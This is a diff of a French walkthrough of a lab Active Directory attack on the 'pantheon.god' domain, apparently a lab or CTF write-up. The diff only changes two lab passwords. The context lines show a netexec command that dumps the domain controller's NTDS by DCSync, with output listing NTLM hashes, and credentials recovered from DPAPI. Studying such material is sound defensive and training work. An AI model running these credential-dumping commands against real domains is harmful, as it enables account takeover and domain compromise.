@@ -273,7 +273,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 - Avec `WinPEAS`, on trouve qu’il y a des credentials dans la `dpapi`
     
     ```bash
-    cmdkey /add:pantheon.god /user:hera /pass:"Qu33n0fG0ds!2024"
+    cmdkey /add:pantheon.god /user:hera /pass:"Qu33n0fG0ds!2025"
     ```
     
     ```bash
@@ -446,7 +446,7 @@ Cela nous permet de faire un `DCsync` pour récupérer tout les hash du domain
 nxc smb "192.168.56.11" -u "$USER" -p "$PASSWORD" --ntds
 [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n]
 SMB         192.168.56.11   445    PANTHEON-DC01    [*] Windows 11 / Server 2025 Build 26100 x64 (name:PANTHEON-DC01) (domain:pantheon.god) (signing:True) (SMBv1:False)
-SMB         192.168.56.11   445    PANTHEON-DC01    [+] pantheon.god\orphee:Mus1cM@st3r!2024 (admin)
+SMB         192.168.56.11   445    PANTHEON-DC01    [+] pantheon.god\orphee:Mus1cM@st3r!2025 (admin)
 SMB         192.168.56.11   445    PANTHEON-DC01    [+] Dumping the NTDS, this could take a while so go grab a redbull...
 SMB         192.168.56.11   445    PANTHEON-DC01    Administrator:500:aad3b435b51404eeaad3b435b51404ee:aff6a388446bba49babad7aaf35aae83:::
 SMB         192.168.56.11   445    PANTHEON-DC01    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
